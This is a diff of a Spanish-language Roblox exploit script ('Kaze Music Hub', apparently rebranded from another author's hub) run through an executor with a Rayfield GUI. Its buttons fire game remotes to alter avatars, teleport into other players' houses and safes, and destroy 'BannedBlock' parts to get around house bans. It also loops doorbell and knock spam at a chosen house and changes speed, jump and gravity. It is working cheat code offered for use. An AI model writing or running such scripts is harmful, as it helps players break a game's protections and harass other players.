                     Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
                 end
-
-                Rayfield:Notify({
-                    Title = "✅ Avatar Copiado",
-                    Content = "Avatar de " .. TargetPlayer .. " copiado exitosamente",
-                    Duration = 3
-                })
+                Rayfield:Notify({ Title = "✅ Avatar Copiado", Content = "Avatar de " .. TargetPlayer .. " copiado exitosamente", Duration = 3 })
             else
-                Rayfield:Notify({
-                    Title = "❌ Error",
-                    Content = "El jugador no tiene un personaje válido",
-                    Duration = 3
-                })
+                Rayfield:Notify({ Title = "❌ Error", Content = "El jugador no tiene un personaje válido", Duration = 3 })
             end
         else
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Content = "Jugador no encontrado o sin personaje",
-                Duration = 3
-            })
+            Rayfield:Notify({ Title = "❌ Error", Content = "Jugador no encontrado o sin personaje", Duration = 3 })
         end
     end
 })
@@ -2331,7 +1870,6 @@ AvatarTb:CreateButton({
 })
 
 AvatarTb:CreateSection("🎀 Paquetes de Cuerpo")
-
 local function ApplyBodyBundle(ids)
     for _, id in ipairs(ids) do
         pcall(function()
@@ -2339,87 +1877,45 @@ local function ApplyBodyBundle(ids)
         end)
         task.wait(0.3)
     end
-    Rayfield:Notify({
-        Title = "✅ Aplicado",
-        Content = "Paquete de cuerpo aplicado",
-        Duration = 2
-    })
+    Rayfield:Notify({ Title = "✅ Aplicado", Content = "Paquete de cuerpo aplicado", Duration = 2 })
 end
 
 AvatarTb:CreateButton({
     Name = "🎀 Viral Girl Body",
     Callback = function()
         ButtonPSound()
-        ApplyBodyBundle({
-            18839824113,
-            18839824209,
-            18839824132,
-            127241951574732,
-            118303475394830
-        })
+        ApplyBodyBundle({ 18839824113, 18839824209, 18839824132, 127241951574732, 118303475394830 })
     end
 })
-
 AvatarTb:CreateButton({
     Name = "🖤 Tall Emo Body",
     Callback = function()
         ButtonPSound()
-        ApplyBodyBundle({
-            15365110905,
-            15365110924,
-            15365110917,
-            96815508293389,
-            121515016872144
-        })
+        ApplyBodyBundle({ 15365110905, 15365110924, 15365110917, 96815508293389, 121515016872144 })
     end
 })
-
 AvatarTb:CreateButton({
     Name = "👗 Zepeto Girl Body",
     Callback = function()
         ButtonPSound()
-        ApplyBodyBundle({
-            115745153758680,
-            18839824209,
-            18839824132,
-            70582373853805,
-            70380761114055
-        })
+        ApplyBodyBundle({ 115745153758680, 18839824209, 18839824132, 70582373853805, 70380761114055 })
     end
 })
-
 AvatarTb:CreateButton({
     Name = "👔 Zepeto Boy Body",
     Callback = function()
         ButtonPSound()
-        ApplyBodyBundle({
-            127731857442064,
-            116852226852049,
-            18839824132,
-            70582373853805,
-            70380761114055
-        })
+        ApplyBodyBundle({ 127731857442064, 116852226852049, 18839824132, 70582373853805, 70380761114055 })
     end
 })
 
 AvatarTb:CreateSection("🦵 Modificadores de Avatar")
-
 local function ApplyBodyMod(useKorblox, useHeadless)
     local p = game:GetService("Players").LocalPlayer
     local hum = p.Character and p.Character:FindFirstChildOfClass("Humanoid")
-    
     if hum then
         local desc = hum:GetAppliedDescription()
-        local args = {
-            [1] = {
-                [1] = desc.Torso,
-                [2] = desc.RightArm,
-                [3] = desc.LeftArm,
-                [4] = useKorblox and 139607718 or desc.RightLeg,
-                [5] = desc.LeftLeg,
-                [6] = useHeadless and 134082579 or desc.Head
-            }
-        }
+        local args = { [1] = { [1] = desc.Torso, [2] = desc.RightArm, [3] = desc.LeftArm, [4] = useKorblox and 139607718 or desc.RightLeg, [5] = desc.LeftLeg, [6] = useHeadless and 134082579 or desc.Head } }
         game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
     end
 end
@@ -2429,39 +1925,25 @@ AvatarTb:CreateButton({
     Callback = function()
         ButtonPSound()
         ApplyBodyMod(true, false)
-        Rayfield:Notify({
-            Title = "✅ Aplicado",
-            Content = "Korblox aplicado",
-            Duration = 2
-        })
+        Rayfield:Notify({ Title = "✅ Aplicado", Content = "Korblox aplicado", Duration = 2 })
     end
 })
-
 AvatarTb:CreateButton({
     Name = "💀 Headless (Cabeza)",
     Callback = function()
         ButtonPSound()
         ApplyBodyMod(false, true)
-        Rayfield:Notify({
-            Title = "✅ Aplicado",
-            Content = "Headless aplicado",
-            Duration = 2
-        })
+        Rayfield:Notify({ Title = "✅ Aplicado", Content = "Headless aplicado", Duration = 2 })
     end
 })
 
 AvatarTb:CreateSection("✨ Accesorios y Auras")
-
 local function AddAvatarItem(itemID, notifyTitle)
     local args = {[1] = itemID}
     pcall(function()
         game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))
     end)
-    Rayfield:Notify({
-        Title = "✅ Aplicado",
-        Content = notifyTitle .. " añadido",
-        Duration = 2
-    })
+    Rayfield:Notify({ Title = "✅ Aplicado", Content = notifyTitle .. " añadido", Duration = 2 })
 end
 
 local accesorios = {
@@ -2479,7 +1961,6 @@ local accesorios = {
     {"🟪 Sombrero Morado con Sonido", 24114402},
     {"🎹 Sombrero con Sonido", 33070696}
 }
-
 for _, acc in ipairs(accesorios) do
     AvatarTb:CreateButton({
         Name = acc[1],
@@ -2491,17 +1972,12 @@ for _, acc in ipairs(accesorios) do
 end
 
 AvatarTb:CreateSection("🎭 Animaciones")
-
 local function ApplyAnimation(id, name)
     local args = {[1] = id}
     pcall(function()
         game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))
     end)
-    Rayfield:Notify({
-        Title = "✅ Animación Aplicada",
-        Content = name .. " activada",
-        Duration = 2
-    })
+    Rayfield:Notify({ Title = "✅ Animación Aplicada", Content = name .. " activada", Duration = 2 })
 end
 
 local AnimData = {
@@ -2547,13 +2023,11 @@ local AnimData = {
         {"Adidas Sport Climb", 18538170170}
     }
 }
-
 for category, animations in pairs(AnimData) do
     local options = {}
     for _, anim in ipairs(animations) do
         table.insert(options, anim[1])
     end
-    
     AvatarTb:CreateDropdown({
         Name = category .. " Animation",
         Options = options,
@@ -2572,11 +2046,8 @@ for category, animations in pairs(AnimData) do
 end
 
 local CasaTab = Window:CreateTab("🏠 Casa", 4483362458)
-
 CasaTab:CreateSection("🌈 RGB")
-
 local houseRgb = false
-
 CasaTab:CreateToggle({
     Name = "🌈 Casa RGB",
     CurrentValue = false,
@@ -2598,7 +2069,6 @@ CasaTab:CreateToggle({
 })
 
 CasaTab:CreateSection("🏠 Utilidades de Casas")
-
 local function getHouseList()
     local Tabela = {}
     local lots = workspace:FindFirstChild("001_Lots")
@@ -2614,7 +2084,6 @@ end
 
 local SelectHouse = nil
 local houseDropdown = nil
-
 houseDropdown = CasaTab:CreateDropdown({
     Name = "Seleccionar Casa",
     Options = getHouseList(),
@@ -2626,34 +2095,22 @@ houseDropdown = CasaTab:CreateDropdown({
     end
 })
 
-
 CasaTab:CreateButton({
     Name = "🔓 Desbanear Casas",
     Callback = function()
         ButtonPSound()
         local lots = workspace:FindFirstChild("001_Lots")
-
         if not lots then
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Content = "001_Lots no existe",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Content = "001_Lots no existe", Duration = 3, Image = 4483362458 })
             return
         end
-
         local count = 0
-
         for _, lot in ipairs(lots:GetChildren()) do
             local picked = lot:FindFirstChild("HousePickedByPlayer")
-
             if picked then
                 local house = picked:FindFirstChild("HouseModel")
-
                 if house then
                     local banned = house:FindFirstChild("BannedBlock")
-
                     if banned then
                         banned:Destroy()
                         count = count + 1
@@ -2661,21 +2118,10 @@ CasaTab:CreateButton({
                 end
             end
         end
-
         if count > 0 then
-            Rayfield:Notify({
-                Title = "✅ Desbaneo Completado",
-                Content = count .. " casas desbaneadas",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "✅ Desbaneo Completado", Content = count .. " casas desbaneadas", Duration = 3, Image = 4483362458 })
         else
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Content = "No se encontraron casas baneadas",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Content = "No se encontraron casas baneadas", Duration = 3, Image = 4483362458 })
         end
     end
 })
@@ -2687,11 +2133,7 @@ CasaTab:CreateButton({
         local houses = getHouseList()
         if houseDropdown then
             houseDropdown:Refresh(houses, true)
-            Rayfield:Notify({
-                Title = "🔄 Actualizado",
-                Duration = 2,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "🔄 Actualizado", Duration = 2, Image = 4483362458 })
         end
     end
 })
@@ -2701,28 +2143,15 @@ CasaTab:CreateButton({
     Callback = function()
         ButtonPSound()
         if not SelectHouse or SelectHouse == "" then
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Duration = 3, Image = 4483362458 })
             return
         end
-        
         local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
         if House and game.Players.LocalPlayer.Character then
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(House.WorldPivot.Position)
-            Rayfield:Notify({
-                Title = "📌 Teletransportado",
-                Duration = 2,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "📌 Teletransportado", Duration = 2, Image = 4483362458 })
         else
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Duration = 2,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Duration = 2, Image = 4483362458 })
         end
     end
 })
@@ -2732,37 +2161,20 @@ CasaTab:CreateButton({
     Callback = function()
         ButtonPSound()
         if not SelectHouse or SelectHouse == "" then
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Duration = 3, Image = 4483362458 })
             return
         end
-        
         local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
         if House and House:FindFirstChild("HousePickedByPlayer") and game.Players.LocalPlayer.Character then
             local safe = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_Safe")
             if safe then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(safe.WorldPivot.Position)
-                Rayfield:Notify({
-                    Title = "💰 Teletransportado",
-                    Duration = 2,
-                    Image = 4483362458,
-                })
+                Rayfield:Notify({ Title = "💰 Teletransportado", Duration = 2, Image = 4483362458 })
             else
-                Rayfield:Notify({
-                    Title = "❌ Error",
-                    Duration = 2,
-                    Image = 4483362458,
-                })
+                Rayfield:Notify({ Title = "❌ Error", Duration = 2, Image = 4483362458 })
             end
         else
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Duration = 2,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Duration = 2, Image = 4483362458 })
         end
     end
 })
@@ -2773,14 +2185,9 @@ CasaTab:CreateToggle({
     Callback = function(Value)
         ButtonPSound()
         if not SelectHouse or SelectHouse == "" then
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Duration = 3, Image = 4483362458 })
             return false
         end
-        
         pcall(function()
             local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
             if House and House:FindFirstChild("HousePickedByPlayer") then
@@ -2795,12 +2202,7 @@ CasaTab:CreateToggle({
                 end
             end
         end)
-        
-        Rayfield:Notify({
-            Title = "🚪 Puertas",
-            Duration = 2,
-            Image = 4483362458,
-        })
+        Rayfield:Notify({ Title = "🚪 Puertas", Duration = 2, Image = 4483362458 })
     end
 })
 
@@ -2810,17 +2212,12 @@ CasaTab:CreateToggle({
     Callback = function(Value)
         ButtonPSound()
         if not SelectHouse or SelectHouse == "" then
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Duration = 3, Image = 4483362458 })
             return false
         end
-        
-        getgenv().ChaosHubAutoSpawnDoorbellValue = Value
+        getgenv().KazeAutoSpawnDoorbellValue = Value
         task.spawn(function()
-            while getgenv().ChaosHubAutoSpawnDoorbellValue do
+            while getgenv().KazeAutoSpawnDoorbellValue do
                 pcall(function()
                     local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
                     if House and House:FindFirstChild("HousePickedByPlayer") then
@@ -2833,12 +2230,7 @@ CasaTab:CreateToggle({
                 task.wait(0.5)
             end
         end)
-        
-        Rayfield:Notify({
-            Title = "🔔 Campanilla",
-            Duration = 2,
-            Image = 4483362458,
-        })
+        Rayfield:Notify({ Title = "🔔 Campanilla", Duration = 2, Image = 4483362458 })
     end
 })
 
@@ -2848,17 +2240,12 @@ CasaTab:CreateToggle({
     Callback = function(Value)
         ButtonPSound()
         if not SelectHouse or SelectHouse == "" then
-            Rayfield:Notify({
-                Title = "❌ Error",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "❌ Error", Duration = 3, Image = 4483362458 })
             return false
         end
-        
-        getgenv().ChaosHubAutoSpawnDoorValue = Value
+        getgenv().KazeAutoSpawnDoorValue = Value
         task.spawn(function()
-            while getgenv().ChaosHubAutoSpawnDoorValue do
+            while getgenv().KazeAutoSpawnDoorValue do
                 pcall(function()
                     local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
                     if House and House:FindFirstChild("HousePickedByPlayer") then
@@ -2871,12 +2258,7 @@ CasaTab:CreateToggle({
                 task.wait(0.5)
             end
         end)
-        
-        Rayfield:Notify({
-            Title = "🚪 Knock",
-            Duration = 2,
-            Image = 4483362458,
-        })
+        Rayfield:Notify({ Title = "🚪 Knock", Duration = 2, Image = 4483362458 })
     end
 })
 
@@ -2886,7 +2268,6 @@ CasaTab:CreateParagraph({
 })
 
 CasaTab:CreateSection("📍 TP Directo")
-
 local casas = {
     ["Casa 1"] = Vector3.new(260.29, 4.37, 209.32),
     ["Casa 2"] = Vector3.new(234.49, 4.37, 228.00),
@@ -2923,7 +2304,6 @@ local casasNomes = {}
 for nome, _ in pairs(casas) do
     table.insert(casasNomes, nome)
 end
-
 table.sort(casasNomes, function(a, b)
     local numA = tonumber(a:match("%d+")) or 0
     local numB = tonumber(b:match("%d+")) or 0
@@ -2940,11 +2320,7 @@ CasaTab:CreateDropdown({
         local casaSelecionada = Option[1]
         if casaSelecionada and game.Players.LocalPlayer.Character then
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(casas[casaSelecionada])
-            Rayfield:Notify({
-                Title = "📍 Teletransportado",
-                Duration = 2,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "📍 Teletransportado", Duration = 2, Image = 4483362458 })
         end
     end
 })
@@ -2958,11 +2334,8 @@ local function limpiarBananas()
     for _, obj in ipairs(workspace:GetDescendants()) do
         if string.find(string.lower(obj.Name), "bananapeel") then
             local touch = obj:FindFirstChild("Touch")
-
             if touch then
-                pcall(function()
-                    touch:Destroy()
-                end)
+                pcall(function() touch:Destroy() end)
             end
         end
     end
@@ -2970,13 +2343,11 @@ end
 
 local function iniciarBananaAnti()
     if BananaThread then return end
-
     BananaThread = task.spawn(function()
         while BananaAnti do
             limpiarBananas()
             task.wait(0.5)
         end
-
         BananaThread = nil
     end)
 end
@@ -2985,32 +2356,22 @@ TabAnti:CreateToggle({
     Name = "🍌 Anti Banana",
     CurrentValue = false,
     Flag = "AntiBanana",
-
     Callback = function(Value)
         BananaAnti = Value
-
-        if Value then
-            iniciarBananaAnti()
-        end
+        if Value then iniciarBananaAnti() end
     end
 })
 
 local antiBallConn = nil
-
 local function DestroyBalls()
     local SoccerBalls = workspace:FindFirstChild("WorkspaceCom")
-
     if SoccerBalls then
         SoccerBalls = SoccerBalls:FindFirstChild("001_SoccerBalls")
     end
-
     if not SoccerBalls then return end
-
     for _, ball in ipairs(SoccerBalls:GetChildren()) do
         if ball:IsA("BasePart") and ball.Name:match("^Soccer") then
-            pcall(function()
-                ball:Destroy()
-            end)
+            pcall(function() ball:Destroy() end)
         end
     end
 end
@@ -3019,7 +2380,6 @@ TabAnti:CreateToggle({
     Name = "⚽ Anti Ball",
     CurrentValue = false,
     Flag = "AntiBall",
-
     Callback = function(Value)
         if Value then
             if not antiBallConn then
@@ -3034,29 +2394,27 @@ TabAnti:CreateToggle({
     end
 })
 
-local Settings = Window:CreateTab("⚙️ Settings", 4483362458) 
-
+local Settings = Window:CreateTab("⚙️ Settings", 4483362458)
 Settings:CreateSection("RGB")
-
 Settings:CreateToggle({
-   Name = "Smooth RGB Name & Bio",
-   CurrentValue = false,
-   Callback = function(Value)
-      ButtonPSound()
-      nameRgb = Value
-      if nameRgb then
-          task.spawn(function()
-              while nameRgb do
-                  local smoothColor = Color3.fromHSV(hueValue, 1, 1)
-                  pcall(function()
-                      NameRemote:FireServer("PickingRPNameColor", smoothColor)
-                      NameRemote:FireServer("PickingRPBioColor", smoothColor)
-                  end)
-                  task.wait(0.8)
-              end
-          end)
-      end
-   end,
+    Name = "Smooth RGB Name & Bio",
+    CurrentValue = false,
+    Callback = function(Value)
+        ButtonPSound()
+        nameRgb = Value
+        if nameRgb then
+            task.spawn(function()
+                while nameRgb do
+                    local smoothColor = Color3.fromHSV(hueValue, 1, 1)
+                    pcall(function()
+                        NameRemote:FireServer("PickingRPNameColor", smoothColor)
+                        NameRemote:FireServer("PickingRPBioColor", smoothColor)
+                    end)
+                    task.wait(0.8)
+                end
+            end)
+        end
+    end,
 })
 
 Settings:CreateSlider({
@@ -3069,7 +2427,6 @@ Settings:CreateSlider({
         humanoid.WalkSpeed = Value
     end
 })
-
 Settings:CreateSlider({
     Name = "JumpPower",
     Range = {50, 300},
@@ -3091,7 +2448,7 @@ Settings:CreateSlider({
         local _, _, hrp = GetChar()
         if not force then
             force = Instance.new("BodyForce")
-            force.Name = "Irving_NoGravity"
+            force.Name = "Kaze_NoGravity"
             force.Parent = hrp
         end
         force.Force = Vector3.new(0, hrp.AssemblyMass * workspace.Gravity * (Value / 500), 0)
@@ -3106,7 +2463,6 @@ Settings:CreateButton({
         humanoid.WalkSpeed = 16
     end
 })
-
 Settings:CreateButton({
     Name = "Reset Jump",
     Callback = function()
@@ -3115,7 +2471,6 @@ Settings:CreateButton({
         humanoid.JumpPower = 50
     end
 })
-
 Settings:CreateButton({
     Name = "Reset Gravity",
     Callback = function()
@@ -3125,25 +2480,25 @@ Settings:CreateButton({
 })
 
 Settings:CreateToggle({
-   Name = "RGB Avatar",
-   CurrentValue = false,
-   Flag = "RGB_Toggle",
-   Callback = function(Value)
-      ButtonPSound()
-      rgbEnabled = Value
-      if rgbEnabled then
-          task.spawn(function()
-              while rgbEnabled do
-                  for _, color in ipairs(colors) do
-                      if not rgbEnabled then break end
-                      local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeBodyColor")
-                      remote:FireServer(color)
-                      task.wait(0.5)
-                  end
-              end
-          end)
-      end
-   end,
+    Name = "RGB Avatar",
+    CurrentValue = false,
+    Flag = "RGB_Toggle",
+    Callback = function(Value)
+        ButtonPSound()
+        rgbEnabled = Value
+        if rgbEnabled then
+            task.spawn(function()
+                while rgbEnabled do
+                    for _, color in ipairs(colors) do
+                        if not rgbEnabled then break end
+                        local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ChangeBodyColor")
+                        remote:FireServer(color)
+                        task.wait(0.5)
+                    end
+                end
+            end)
+        end
+    end,
 })
 
 Settings:CreateSection("Server Option")
@@ -3155,7 +2510,6 @@ Settings:CreateButton({
         TeleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
     end
 })
-
 Settings:CreateButton({
     Name = "❌ Destroy GUI",
     Callback = function()
@@ -3163,7 +2517,7 @@ Settings:CreateButton({
         local s = Instance.new("Sound")
         s.Name = "DestroySoundEffect"
         s.SoundId = "rbxassetid://104269922408932"
-        s.Volume = 10 
+        s.Volume = 10
         s.Parent = game:GetService("SoundService")
         s:Play()
         Rayfield:Destroy()
@@ -3171,13 +2525,9 @@ Settings:CreateButton({
     end
 })
 
-Settings:CreateParagraph({
-    Title = "Version",
-    Content = "2.9.5"
-})
+Settings:CreateParagraph({ Title = "Version", Content = "2.9.5" })
 
 local DEV_USER = "Hiimnew928289alt2"
-
 local function GetCrownStatus()
     local status = ReplicatedStorage:FindFirstChild("CrownStatus")
     if not status then
@@ -3188,7 +2538,6 @@ local function GetCrownStatus()
     end
     return status
 end
-
 local crownStatus = GetCrownStatus()
 
 local function addOwnerLabel(character)
@@ -3196,14 +2545,12 @@ local function addOwnerLabel(character)
     local head = character:FindFirstChild("Head")
     if not head then return end
     if head:FindFirstChild("OwnerLabel") then return end
-
     local label = Instance.new("BillboardGui")
     label.Name = "OwnerLabel"
     label.Size = UDim2.new(0, 100, 0, 40)
     label.StudsOffset = Vector3.new(0, 3, 0)
     label.AlwaysOnTop = true
     label.Parent = head
-
     local text = Instance.new("TextLabel")
     text.Size = UDim2.new(1, 0, 1, 0)
     text.BackgroundTransparency = 1
@@ -3218,29 +2565,23 @@ end
 
 local function updateLabel(character)
     if not character then return end
-    
     if crownStatus.Value then
         addOwnerLabel(character)
     else
         local head = character:FindFirstChild("Head")
         if head then
             local existing = head:FindFirstChild("OwnerLabel")
-            if existing then
-                existing:Destroy()
-            end
+            if existing then existing:Destroy() end
         end
     end
 end
 
 local function watchOwner(plr)
     if plr.Name ~= DEV_USER then return end
-
     task.spawn(function()
         while plr.Parent do
             local char = plr.Character
-            if char then
-                updateLabel(char)
-            end
+            if char then updateLabel(char) end
             task.wait(1)
         end
     end)
@@ -3249,7 +2590,6 @@ end
 for _, plr in pairs(Players:GetPlayers()) do
     watchOwner(plr)
 end
-
 Players.PlayerAdded:Connect(function(plr)
     watchOwner(plr)
     if plr.Name == DEV_USER then
@@ -3263,41 +2603,18 @@ end)
 player.Chatted:Connect(function(msg)
     if msg:lower() == "!crown on" then
         if player.Name ~= DEV_USER then
-            Rayfield:Notify({
-                Title = "⚠️ Sin permiso",
-                Content = "Solo el desarrollador puede usar este comando.",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "⚠️ Sin permiso", Content = "Solo el desarrollador puede usar este comando.", Duration = 3, Image = 4483362458 })
             return
         end
-        
         crownStatus.Value = true
-        Rayfield:Notify({
-            Title = "👑 Owner visible",
-            Content = "El texto 'Owner' ahora es visible.",
-            Duration = 3,
-            Image = 4483362458,
-        })
-        
+        Rayfield:Notify({ Title = "👑 Owner visible", Content = "El texto 'Owner' ahora es visible.", Duration = 3, Image = 4483362458 })
     elseif msg:lower() == "!crown off" then
         if player.Name ~= DEV_USER then
-            Rayfield:Notify({
-                Title = "⚠️ Sin permiso",
-                Content = "Solo el desarrollador puede usar este comando.",
-                Duration = 3,
-                Image = 4483362458,
-            })
+            Rayfield:Notify({ Title = "⚠️ Sin permiso", Content = "Solo el desarrollador puede usar este comando.", Duration = 3, Image = 4483362458 })
             return
         end
-        
         crownStatus.Value = false
-        Rayfield:Notify({
-            Title = "👑 Owner oculto",
-            Content = "El texto 'Owner' ya no es visible.",
-            Duration = 3,
-            Image = 4483362458,
-        })
+        Rayfield:Notify({ Title = "👑 Owner oculto", Content = "El texto 'Owner' ya no es visible.", Duration = 3, Image = 4483362458 })
     end
 end)
 
@@ -3324,13 +2641,11 @@ end
 local function ShowOwnerNotification()
     if notificationShown then return end
     notificationShown = true
-
     local gui = Instance.new("ScreenGui")
     gui.Name = "OwnerNotificationGUI"
     gui.ResetOnSpawn = false
     gui.Parent = game:GetService("CoreGui")
     gui.DisplayOrder = 999
-
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 280, 0, 60)
     frame.Position = UDim2.new(0.5, -140, 0.5, -30)
@@ -3339,12 +2654,10 @@ local function ShowOwnerNotification()
     frame.BorderSizePixel = 0
     frame.Parent = gui
     Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
-
     local border = Instance.new("UIStroke", frame)
     border.Thickness = 2
     border.Color = Color3.fromRGB(255, 215, 0)
     border.Transparency = 0.3
-
     local text = Instance.new("TextLabel")
     text.Size = UDim2.new(1, 0, 1, 0)
     text.BackgroundTransparency = 1
@@ -3353,7 +2666,6 @@ local function ShowOwnerNotification()
     text.TextSize = 20
     text.Font = Enum.Font.GothamBold
     text.Parent = frame
-
     task.spawn(function()
         while gui and gui.Parent do
             frame.BackgroundTransparency = 0.4
@@ -3362,27 +2674,16 @@ local function ShowOwnerNotification()
             task.wait(0.5)
         end
     end)
-
     text.TextTransparency = 1
-    TweenService:Create(text, TweenInfo.new(0.5), {
-        TextTransparency = 0
-    }):Play()
-
+    TweenService:Create(text, TweenInfo.new(0.5), { TextTransparency = 0 }):Play()
     task.wait(10)
-
-    TweenService:Create(text, TweenInfo.new(0.5), {
-        TextTransparency = 1
-    }):Play()
-    TweenService:Create(frame, TweenInfo.new(0.5), {
-        BackgroundTransparency = 1
-    }):Play()
-
+    TweenService:Create(text, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
+    TweenService:Create(frame, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
     task.wait(0.6)
     gui:Destroy()
 end
 
 local controlFolder = GetControlFolder()
-
 local function CheckForOwner()
     if player.Name == OWNER_USERNAME then
         local ownerMarker = controlFolder:FindFirstChild("OwnerExecuted")
@@ -3392,7 +2693,6 @@ local function CheckForOwner()
             ownerMarker.Value = true
             ownerMarker.Parent = controlFolder
         end
-        
     else
         local ownerMarker = controlFolder:FindFirstChild("OwnerExecuted")
         if ownerMarker and ownerMarker.Value then
@@ -3406,7 +2706,6 @@ local function CheckForOwner()
         end
     end
 end
-
 CheckForOwner()
 
 Players.PlayerAdded:Connect(function(player)
@@ -3442,36 +2741,32 @@ local function GetColorValue()
     end
     return colorValue
 end
-
 local colorValue = GetColorValue()
 
 local function addOwnerLabel(character)
     if not character then return end
     local head = character:FindFirstChild("Head")
     if not head then return end
-    if head:FindFirstChild("OwnerLabel") then 
+    if head:FindFirstChild("OwnerLabel") then
         head:FindFirstChild("OwnerLabel"):Destroy()
     end
-
     local label = Instance.new("BillboardGui")
     label.Name = "OwnerLabel"
     label.Size = UDim2.new(0, 100, 0, 40)
     label.StudsOffset = Vector3.new(0, 3, 0)
     label.AlwaysOnTop = true
     label.Parent = head
-
     local text = Instance.new("TextLabel")
     text.Name = "OwnerText"
     text.Size = UDim2.new(1, 0, 1, 0)
     text.BackgroundTransparency = 1
-    text.Text = "👑 Creador de Irvinglz1 Hub 👑"
+    text.Text = "👑 Creador de Kaze Music Hub 👑"
     text.TextColor3 = ownerTagColor
     text.TextScaled = true
     text.Font = Enum.Font.GothamBold
     text.TextStrokeTransparency = 0.3
     text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     text.Parent = label
-
     ownerTagLabel = text
 end
 
@@ -3480,9 +2775,7 @@ local function removeOwnerLabel(character)
     local head = character:FindFirstChild("Head")
     if head then
         local existing = head:FindFirstChild("OwnerLabel")
-        if existing then
-            existing:Destroy()
-        end
+        if existing then existing:Destroy() end
     end
     ownerTagLabel = nil
 end
@@ -3499,28 +2792,20 @@ end
 local function watchOwner()
     local function processPlayer(plr)
         if plr.Name ~= DEV_USER then return end
-        
-        if plr.Character then
-            addOwnerLabel(plr.Character)
-        end
-        
+        if plr.Character then addOwnerLabel(plr.Character) end
         plr.CharacterAdded:Connect(function(char)
             task.wait(0.5)
             addOwnerLabel(char)
         end)
     end
-    
     for _, plr in pairs(Players:GetPlayers()) do
         processPlayer(plr)
     end
-    
     Players.PlayerAdded:Connect(processPlayer)
 end
-
 watchOwner()
 
 local arcoirisActive = true
-
 task.spawn(function()
     while arcoirisActive do
         pcall(function()
@@ -3533,155 +2818,20 @@ task.spawn(function()
                 Color3.fromRGB(75, 0, 130),
                 Color3.fromRGB(148, 0, 211),
             }
-            
             for colorIndex = 1, #colors do
                 if not arcoirisActive then break end
-                
                 local currentColor = colors[colorIndex]
                 local nextColor = colors[(colorIndex % #colors) + 1]
-                
                 for i = 0, 1, 0.05 do
                     if not arcoirisActive then break end
-                    
                     local r = math.lerp(currentColor.R, nextColor.R, i)
                     local g = math.lerp(currentColor.G, nextColor.G, i)
                     local b = math.lerp(currentColor.B, nextColor.B, i)
                     local newColor = Color3.fromRGB(r * 255, g * 255, b * 255)
-                    
-                    pcall(function()
-                        colorValue.Value = newColor
-                    end)
+                    pcall(function() colorValue.Value = newColor end)
                     updateOwnerTagColor(newColor)
                     task.wait(0.1)
                 end
-            end
-        end)
-    end
-end)
-
-local IRVING_ID = 5712710685
-local irvingTagColor = Color3.fromRGB(0, 0, 0)
-local irvingTagLabel = nil
-
-local function GetIrvingColorFolder()
-    local folder = ReplicatedStorage:FindFirstChild("IrvingColorSync")
-    if not folder then
-        folder = Instance.new("Folder")
-        folder.Name = "IrvingColorSync"
-        folder.Parent = ReplicatedStorage
-    end
-    return folder
-end
-
-local function GetIrvingColorValue()
-    local colorFolder = GetIrvingColorFolder()
-    local colorValue = colorFolder:FindFirstChild("CurrentColor")
-    if not colorValue then
-        colorValue = Instance.new("Color3Value")
-        colorValue.Name = "CurrentColor"
-        colorValue.Value = Color3.fromRGB(0, 0, 0)
-        colorValue.Parent = colorFolder
-    end
-    return colorValue
-end
-
-local irvingColorValue = GetIrvingColorValue()
-
-local function addIrvingTag(character)
-    if not character then return end
-    local head = character:FindFirstChild("Head")
-    if not head then return end
-    if head:FindFirstChild("IrvingTag") then 
-        head:FindFirstChild("IrvingTag"):Destroy()
-    end
-
-    local label = Instance.new("BillboardGui")
-    label.Name = "IrvingTag"
-    label.Size = UDim2.new(0, 120, 0, 40)
